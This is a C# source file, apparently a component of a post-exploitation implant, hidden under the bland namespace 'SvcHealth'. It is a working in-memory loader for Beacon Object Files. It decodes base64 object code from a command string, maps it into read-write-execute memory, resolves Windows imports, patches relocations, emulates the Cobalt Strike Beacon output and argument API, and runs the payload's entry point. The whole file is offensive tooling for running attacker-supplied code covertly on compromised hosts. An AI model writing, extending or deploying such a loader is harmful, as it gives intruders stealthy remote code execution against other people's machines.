using System;
using System.Collections.Generic;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcHealth
{
    static class BofLoader
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr addr, uint size, uint type);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr addr, uint size, uint protect, out uint old);
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibraryA(string name);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hMod, string name);

        const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, MEM_RELEASE = 0x8000;
        const uint PAGE_RW = 0x04, PAGE_RX = 0x20, PAGE_RWX = 0x40;
        const ushort MACHINE_AMD64 = 0x8664;
        const ushort REL_ADDR64 = 0x0001, REL_ADDR32NB = 0x0003, REL_REL32 = 0x0004;
        const byte SYM_EXTERNAL = 2;
        const uint SCN_EXEC = 0x20000000;
        const int PAGE_SIZE = 0x1000;

        static StringBuilder _out;

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate void FPf(int t, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate void FBo(int t, IntPtr d, int len);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate void FDp(IntPtr p, IntPtr buf, int sz);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int FDi(IntPtr p);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate short FDs(IntPtr p);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate IntPtr FDe(IntPtr p, IntPtr outSz);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int FDl(IntPtr p);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate void FGo(IntPtr args, int alen);

        static FPf _dPf;
        static FBo _dBo;
        static FDp _dDp;
        static FDi _dDi;
        static FDs _dDs;
        static FDe _dDe;
        static FDl _dDl;

        static Dictionary<string, IntPtr> _beaconPtrs;

        static void InitBeaconApi()
        {
            _dPf = new FPf(BPrintf);
            _dBo = new FBo(BOutput);
            _dDp = new FDp(BDataParse);
            _dDi = new FDi(BDataInt);
            _dDs = new FDs(BDataShort);
            _dDe = new FDe(BDataExtract);
            _dDl = new FDl(BDataLength);

            _beaconPtrs = new Dictionary<string, IntPtr>();
            _beaconPtrs["BeaconPrintf"] = Marshal.GetFunctionPointerForDelegate(_dPf);
            _beaconPtrs["BeaconOutput"] = Marshal.GetFunctionPointerForDelegate(_dBo);
            _beaconPtrs["BeaconDataParse"] = Marshal.GetFunctionPointerForDelegate(_dDp);
            _beaconPtrs["BeaconDataInt"] = Marshal.GetFunctionPointerForDelegate(_dDi);
            _beaconPtrs["BeaconDataShort"] = Marshal.GetFunctionPointerForDelegate(_dDs);
            _beaconPtrs["BeaconDataExtract"] = Marshal.GetFunctionPointerForDelegate(_dDe);
            _beaconPtrs["BeaconDataLength"] = Marshal.GetFunctionPointerForDelegate(_dDl);
        }

        static void BPrintf(int t, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6)
        {
            if (fmt == IntPtr.Zero) return;
            string f = Marshal.PtrToStringAnsi(fmt);
            if (f == null) return;
            IntPtr[] av = { a1, a2, a3, a4, a5, a6 };
            int ai = 0;
            var sb = new StringBuilder();
            for (int i = 0; i < f.Length; i++)
            {
                if (f[i] != '%' || i + 1 >= f.Length) { sb.Append(f[i]); continue; }
                i++;
                while (i < f.Length && "-+ #0".IndexOf(f[i]) >= 0) i++;
                while (i < f.Length && f[i] >= '0' && f[i] <= '9') i++;
                if (i < f.Length && f[i] == '.') { i++; while (i < f.Length && f[i] >= '0' && f[i] <= '9') i++; }
                bool wide = false;
                if (i < f.Length && f[i] == 'l') { wide = true; i++; if (i < f.Length && f[i] == 'l') i++; }
                else if (i < f.Length && (f[i] == 'h' || f[i] == 'z' || f[i] == 'I')) { i++; if (i < f.Length && f[i] == f[i - 1]) i++; }
                if (i >= f.Length) break;
                char c = f[i];
                if (c == '%') { sb.Append('%'); continue; }
                if (ai >= av.Length) break;
                IntPtr v = av[ai++];
                switch (c)
                {
                    case 's':
                        if (wide) sb.Append(v != IntPtr.Zero ? Marshal.PtrToStringUni(v) : "(null)");
                        else sb.Append(v != IntPtr.Zero ? Marshal.PtrToStringAnsi(v) : "(null)");
                        break;
                    case 'S': sb.Append(v != IntPtr.Zero ? Marshal.PtrToStringUni(v) : "(null)"); break;
                    case 'd': case 'i': sb.Append((int)v.ToInt64()); break;
                    case 'u': sb.Append((uint)v.ToInt64()); break;
                    case 'x': sb.Append(v.ToInt64().ToString("x")); break;
                    case 'X': sb.Append(v.ToInt64().ToString("X")); break;
                    case 'p': sb.Append("0x"); sb.Append(v.ToInt64().ToString("x")); break;
                    case 'c': sb.Append((char)(v.ToInt64() & 0xFF)); break;
                    default: sb.Append('%'); sb.Append(c); ai--; break;
                }
            }
            _out.AppendLine(sb.ToString());
        }

        static void BOutput(int t, IntPtr d, int len)
        {
            if (d == IntPtr.Zero || len <= 0) return;
            var buf = new byte[len];
            Marshal.Copy(d, buf, 0, len);
            _out.Append(Encoding.UTF8.GetString(buf));
        }

        static void BDataParse(IntPtr p, IntPtr buf, int sz)
        {
            if (p == IntPtr.Zero) return;
            Marshal.WriteIntPtr(p, 0, buf);
            Marshal.WriteIntPtr(p, 8, buf);
            Marshal.WriteInt32(p, 16, sz);
            Marshal.WriteInt32(p, 20, sz);
        }

        static int BDataInt(IntPtr p)
        {
            if (p == IntPtr.Zero) return 0;
            int rem = Marshal.ReadInt32(p, 16);
            if (rem < 4) return 0;
            IntPtr buf = Marshal.ReadIntPtr(p, 8);
            var b = new byte[4]; Marshal.Copy(buf, b, 0, 4);
            int val = (b[0] << 24) | (b[1] << 16) | (b[2] << 8) | b[3];
            Marshal.WriteIntPtr(p, 8, new IntPtr(buf.ToInt64() + 4));
            Marshal.WriteInt32(p, 16, rem - 4);
            return val;
        }

        static short BDataShort(IntPtr p)
        {
            if (p == IntPtr.Zero) return 0;
            int rem = Marshal.ReadInt32(p, 16);
            if (rem < 2) return 0;
            IntPtr buf = Marshal.ReadIntPtr(p, 8);
            var b = new byte[2]; Marshal.Copy(buf, b, 0, 2);
            short val = (short)((b[0] << 8) | b[1]);
            Marshal.WriteIntPtr(p, 8, new IntPtr(buf.ToInt64() + 2));
            Marshal.WriteInt32(p, 16, rem - 2);
            return val;
        }

        static IntPtr BDataExtract(IntPtr p, IntPtr outSz)
        {
            if (p == IntPtr.Zero) return IntPtr.Zero;
            int rem = Marshal.ReadInt32(p, 16);
            if (rem < 4) return IntPtr.Zero;
            IntPtr buf = Marshal.ReadIntPtr(p, 8);
            var lb = new byte[4]; Marshal.Copy(buf, lb, 0, 4);
            int len = (lb[0] << 24) | (lb[1] << 16) | (lb[2] << 8) | lb[3];
            if (len > rem - 4) len = rem - 4;
            IntPtr data = new IntPtr(buf.ToInt64() + 4);
            int adv = 4 + len;
            Marshal.WriteIntPtr(p, 8, new IntPtr(buf.ToInt64() + adv));
            Marshal.WriteInt32(p, 16, rem - adv);
            if (outSz != IntPtr.Zero) Marshal.WriteInt32(outSz, 0, len);
            return data;
        }

        static int BDataLength(IntPtr p)
        {
            return p == IntPtr.Zero ? 0 : Marshal.ReadInt32(p, 16);
        }

        static string SymName(byte[] coff, int symOff, int strTbl)
        {
            if (coff[symOff] == 0 && coff[symOff + 1] == 0 && coff[symOff + 2] == 0 && coff[symOff + 3] == 0)
            {
                int off = BitConverter.ToInt32(coff, symOff + 4);
                int end = strTbl + off;
                while (end < coff.Length && coff[end] != 0) end++;
                return Encoding.ASCII.GetString(coff, strTbl + off, end - strTbl - off);
            }
            int e = symOff;
            while (e < symOff + 8 && e < coff.Length && coff[e] != 0) e++;
            return Encoding.ASCII.GetString(coff, symOff, e - symOff);
        }

        public static string Run(string command)
        {
            try
            {
                string rest = command.Substring(6);
                string entry = "go";
                byte[] args = new byte[0];
                byte[] coff;

                int sep1 = rest.IndexOf(':');
                if (sep1 < 0)
                {
                    coff = Convert.FromBase64String(rest);
                }
                else
                {
                    int sep2 = rest.IndexOf(':', sep1 + 1);
                    if (sep2 < 0)
                    {
                        coff = Convert.FromBase64String(rest);
                    }
                    else
                    {
                        entry = rest.Substring(0, sep1);
                        string argsB64 = rest.Substring(sep1 + 1, sep2 - sep1 - 1);
                        if (!string.IsNullOrEmpty(argsB64))
                            args = Convert.FromBase64String(argsB64);
                        coff = Convert.FromBase64String(rest.Substring(sep2 + 1));
                    }
                }

                return Execute(coff, args, entry);
            }
            catch { return "bof: parse error"; }
        }

        [HandleProcessCorruptedStateExceptions]
        static string Execute(byte[] coff, byte[] bofArgs, string entry)
        {
            _out = new StringBuilder();
            InitBeaconApi();
            IntPtr arena = IntPtr.Zero;
            var heapAllocs = new List<IntPtr>();
            IntPtr argsPtr = IntPtr.Zero;

            try
            {
                if (coff.Length < 20) return "bof: invalid";
                ushort machine = BitConverter.ToUInt16(coff, 0);
                if (machine != MACHINE_AMD64) return "bof: not x64";

                ushort nSec = BitConverter.ToUInt16(coff, 2);
                int symPtr = BitConverter.ToInt32(coff, 8);
                int nSym = BitConverter.ToInt32(coff, 12);
                ushort optSz = BitConverter.ToUInt16(coff, 16);
                int secStart = 20 + optSz;
                int strTbl = symPtr + nSym * 18;

                int extCount = 0;
                for (int i = 0; i < nSym; i++)
                {
                    int o = symPtr + i * 18;
                    short sn = BitConverter.ToInt16(coff, o + 12);
                    byte sc = coff[o + 16];
                    byte aux = coff[o + 17];
                    if (sn == 0 && sc == SYM_EXTERNAL) extCount++;
                    i += aux;
                }

                uint totalSize = 0;
                var secOffsets = new uint[nSec];
                var secSizes = new uint[nSec];
                var secChars = new uint[nSec];
                for (int i = 0; i < nSec; i++)
                {
                    int o = secStart + i * 40;
                    uint vs = BitConverter.ToUInt32(coff, o + 8);
                    uint rs = BitConverter.ToUInt32(coff, o + 16);
                    uint chars = BitConverter.ToUInt32(coff, o + 36);
                    uint sz = Math.Max(vs, rs);
                    if (sz == 0) sz = 64;
                    sz = (sz + (uint)PAGE_SIZE - 1) & ~((uint)PAGE_SIZE - 1);
                    secOffsets[i] = totalSize;
                    secSizes[i] = sz;
                    secChars[i] = chars;
                    totalSize += sz;
                }

                uint auxOff = totalSize;
                uint auxSize = (uint)((extCount * 22 + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1));
                if (auxSize < (uint)PAGE_SIZE) auxSize = (uint)PAGE_SIZE;
                totalSize += auxSize;

                arena = VirtualAlloc(IntPtr.Zero, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_RWX);
                if (arena == IntPtr.Zero) return "bof: alloc failed";

                for (int i = 0; i < nSec; i++)
                {
                    int o = secStart + i * 40;
                    uint rp = BitConverter.ToUInt32(coff, o + 20);
                    uint rs = BitConverter.ToUInt32(coff, o + 16);
                    if (rs > 0 && rp > 0 && rp + rs <= coff.Length)
                        Marshal.Copy(coff, (int)rp, new IntPtr(arena.ToInt64() + secOffsets[i]), (int)rs);
                }

                int auxCur = 0;
                IntPtr auxBase = new IntPtr(arena.ToInt64() + auxOff);

                var symAddrs = new IntPtr[nSym];
                var symNames = new string[nSym];

                for (int i = 0; i < nSym; i++)
                {
                    int o = symPtr + i * 18;
                    string name = SymName(coff, o, strTbl);
                    int val = BitConverter.ToInt32(coff, o + 8);
                    short sn = BitConverter.ToInt16(coff, o + 12);
                    byte sc = coff[o + 16];
                    byte aux = coff[o + 17];
                    symNames[i] = name;

                    if (sn > 0 && sn <= nSec)
                    {
                        symAddrs[i] = new IntPtr(arena.ToInt64() + secOffsets[sn - 1] + val);
                    }
                    else if (sn == 0 && sc == SYM_EXTERNAL)
                    {
                        symAddrs[i] = ResolveExt(name, auxBase, ref auxCur, heapAllocs);
                    }

                    i += aux;
                }

                for (int s = 0; s < nSec; s++)
                {
                    int o = secStart + s * 40;
                    int rp = BitConverter.ToInt32(coff, o + 24);
                    ushort nr = BitConverter.ToUInt16(coff, o + 32);

                    for (int r = 0; r < nr; r++)
                    {
                        int ro = rp + r * 10;
                        uint va = BitConverter.ToUInt32(coff, ro);
                        int si = BitConverter.ToInt32(coff, ro + 4);
                        ushort type = BitConverter.ToUInt16(coff, ro + 8);
                        if (si < 0 || si >= nSym) continue;

                        IntPtr patch = new IntPtr(arena.ToInt64() + secOffsets[s] + va);
                        IntPtr target = symAddrs[si];
                        Reloc(patch, target, type);
                    }
                }

                for (int i = 0; i < nSec; i++)
                {
                    IntPtr secBase = new IntPtr(arena.ToInt64() + secOffsets[i]);
                    uint prot = (secChars[i] & SCN_EXEC) != 0 ? PAGE_RX : PAGE_RW;
                    uint old;
                    VirtualProtect(secBase, secSizes[i], prot, out old);
                }

                IntPtr entryAddr = IntPtr.Zero;
                for (int i = 0; i < nSym; i++)
                {
                    if (symNames[i] == null) continue;
                    string n = symNames[i];
                    if (n == entry || n == "_" + entry || n.TrimEnd('_') == entry)
                    {
                        if (symAddrs[i] != IntPtr.Zero) { entryAddr = symAddrs[i]; break; }
                    }
                }

                if (entryAddr == IntPtr.Zero) return "bof: entry not found";

                var fn = (FGo)Marshal.GetDelegateForFunctionPointer(entryAddr, typeof(FGo));

                if (bofArgs.Length > 0)
                {
                    argsPtr = Marshal.AllocHGlobal(bofArgs.Length);
                    Marshal.Copy(bofArgs, 0, argsPtr, bofArgs.Length);
                }

                fn(argsPtr, bofArgs.Length);

                string result = _out.ToString().TrimEnd();
                return string.IsNullOrEmpty(result) ? "bof: ok" : result;
            }
            catch (Exception ex)
            {
                string partial = _out != null ? _out.ToString().TrimEnd() : "";
                string err = "bof: " + ex.GetType().Name;
                return string.IsNullOrEmpty(partial) ? err : partial + "\n" + err;
            }
            finally
            {
                if (argsPtr != IntPtr.Zero) Marshal.FreeHGlobal(argsPtr);
                foreach (var h in heapAllocs) Marshal.FreeHGlobal(h);
                if (arena != IntPtr.Zero) VirtualFree(arena, 0, MEM_RELEASE);
            }
        }

        static IntPtr ResolveExt(string name, IntPtr auxBase, ref int auxCur, List<IntPtr> heap)
        {
            string clean = name.StartsWith("__imp_") ? name.Substring(6) : name;
            bool isImp = name.StartsWith("__imp_");

            IntPtr funcPtr = IntPtr.Zero;
            if (_beaconPtrs.ContainsKey(clean))
            {
                funcPtr = _beaconPtrs[clean];
            }
            else
            {
                int dollar = clean.IndexOf('$');
                if (dollar > 0)
                {
                    string lib = clean.Substring(0, dollar);
                    string func = clean.Substring(dollar + 1);
                    IntPtr hMod = LoadLibraryA(lib + ".dll");
                    if (hMod == IntPtr.Zero) hMod = LoadLibraryA(lib);
                    if (hMod != IntPtr.Zero) funcPtr = GetProcAddress(hMod, func);
                }
            }

            if (funcPtr == IntPtr.Zero) return IntPtr.Zero;

            if (isImp)
            {
                IntPtr slot = new IntPtr(auxBase.ToInt64() + auxCur);
                Marshal.WriteIntPtr(slot, funcPtr);
                auxCur += 8;
                return slot;
            }
            else
            {
                IntPtr tramp = new IntPtr(auxBase.ToInt64() + auxCur);
                // jmp qword ptr [rip+0] = FF 25 00 00 00 00
                Marshal.WriteByte(tramp, 0, 0xFF);
                Marshal.WriteByte(tramp, 1, 0x25);
                Marshal.WriteInt32(tramp, 2, 0);
                Marshal.WriteIntPtr(tramp, 6, funcPtr);
                auxCur += 14;
                return tramp;
            }
        }

        static void Reloc(IntPtr patch, IntPtr target, ushort type)
        {
            if (target == IntPtr.Zero) return;
            switch (type)
            {
                case REL_ADDR64:
                    long a64 = Marshal.ReadInt64(patch);
                    Marshal.WriteInt64(patch, target.ToInt64() + a64);
                    break;
                case REL_ADDR32NB:
                    int a32 = Marshal.ReadInt32(patch);
                    Marshal.WriteInt32(patch, (int)(target.ToInt64() + a32));
                    break;
                case REL_REL32:
                case 0x0005: // REL32_1
                case 0x0006: // REL32_2
                case 0x0007: // REL32_3
                case 0x0008: // REL32_4
                case 0x0009: // REL32_5
                    int extra = type - REL_REL32;
                    int addend = Marshal.ReadInt32(patch);
                    long delta = (target.ToInt64() + addend) - (patch.ToInt64() + 4 + extra);
                    Marshal.WriteInt32(patch, (int)delta);
                    break;
            }
        }
    }
}
